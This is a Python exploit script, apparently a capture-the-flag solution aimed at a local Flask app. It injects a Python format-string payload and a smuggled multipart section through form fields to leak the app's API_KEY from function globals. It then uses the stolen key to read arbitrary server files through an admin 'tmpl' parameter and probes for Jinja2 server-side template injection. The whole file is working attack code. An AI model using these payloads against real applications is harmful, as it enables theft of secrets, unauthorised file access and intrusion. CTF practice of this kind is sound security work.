import httpx

TARGET = "http://127.0.0.1:5000"
BOUNDARY = "---------------------------FlagBoundary123"

def get_api_key():
    fmt_payload = "{0.view_functions[action].__globals__[API_KEY]}"
    fake_action_part = (
        f'\r\n--{BOUNDARY}\r\n'
        f'Content-Disposition: form-data; name="action"; filename="action"\r\n'
        f'Content-Type: text/json\r\n\r\n'
        f'{{"type": "debug"}}\r\n'
    )
    text = fmt_payload + fake_action_part
    params = {'text': text, 'client': 'Content-Type', 'token': f'multipart/form-data; boundary={BOUNDARY}'}
    r = httpx.post(f'{TARGET}/heartbeat', data=params, timeout=10.0)
    return r.text.strip()

def read_file_via_admin_raw(api_key, path):
    """直接读取文件，获取原始响应"""
    headers = {"Authorization": api_key}
    try:
        r = httpx.get(f"{TARGET}/admin", params={"tmpl": path}, headers=headers, timeout=30.0)
        return r.text, r.status_code, r.headers
    except Exception as e:
        return str(e), 0, {}

if __name__ == "__main__":
    api_key = get_api_key()
    print(f"[+] API_KEY: {api_key}")
    
    # 尝试读取 METADATA 文件触发 SSTI
    print("\n[*] Trying to trigger SSTI via jinja2 METADATA...")
    content, code, headers = read_file_via_admin_raw(api_key, "/usr/local/lib/python3.13/site-packages/jinja2-3.1.6.dist-info/METADATA")
    print(f"Status: {code}")
    print(f"Response length: {len(content)}")
    
    # 如果有错误，可能是 SSTI 尝试渲染时失败了
    if code == 500:
        print("[!] 500 Error - SSTI might be triggered but failed")
        print(f"Content: {content}")
    elif code == 200:
        # 检查 {{ user.url }} 是否被渲染
        if '{{ user.url }}' in content:
            print("[-] SSTI not triggered - raw template returned")
        else:
            print("[!] SSTI might be triggered!")
            # 查找原来的 {{ }} 是否还存在
            if '{{' not in content[:5000]:
                print("[+] Jinja2 syntax was processed!")
